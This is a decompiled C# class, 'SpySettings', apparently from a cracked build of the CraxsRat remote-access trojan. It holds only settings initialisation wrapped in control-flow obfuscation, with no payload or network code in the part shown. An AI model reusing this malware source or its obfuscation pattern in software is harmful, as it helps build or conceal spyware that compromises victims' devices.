// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.SpySettings
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [StandardModule]
  internal sealed class SpySettings
  {
    private string holder;
    private int index;
    public bool Finish;
    public bool S;
    public int \u0024State;
    public AsyncVoidMethodBuilder \u0024Builder;
    internal Form \u0024VB\u0024Local_o;
    internal int \u0024VB\u0024Local_interval;
    internal Ports \u0024VB\u0024Me;
    internal Form \u0024S0;
    internal TaskAwaiter \u0024A0;
    public string \u0024VB\u0024Local_re;
    public Exception \u0024VB\u0024Local_ex;
    public static readonly Ports._Closure\u0024__ \u0024I;
    public static VB\u0024AnonymousDelegate_0 \u0024I227\u002D0;
    public static VB\u0024AnonymousDelegate_0 \u0024I227\u002D1;
    public static VB\u0024AnonymousDelegate_0 \u0024I227\u002D2;
    public static VB\u0024AnonymousDelegate_0 \u0024I227\u002D3;
    public static VB\u0024AnonymousDelegate_0 \u0024I227\u002D4;
    public static VB\u0024AnonymousDelegate_0 \u0024I227\u002D5;
    public static VB\u0024AnonymousDelegate_0 \u0024I227\u002D6;
    public static VB\u0024AnonymousDelegate_0 \u0024I228\u002D0;
    public static VB\u0024AnonymousDelegate_0 \u0024I228\u002D1;

    static SpySettings()
    {
      Settings.multi = false;
      Settings.Snds = (MultiSounds) new Notif_Sound();
label_1:
      int num1 = 1256688961;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -((num1 + ~~(295258880 * -1916901517 - 216687445 - (1552275831 + (-601047169 ^ -174141616)))) * 1897295677)) % 3U)
        {
          case 1:
            Settings.path_File = Settings.res_Path + EXGuarder.\u0035A1B1901;
            num1 = (int) num2 * 1596582974 ^ 1486003615;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      Settings.id = 0;
    }
  }
}
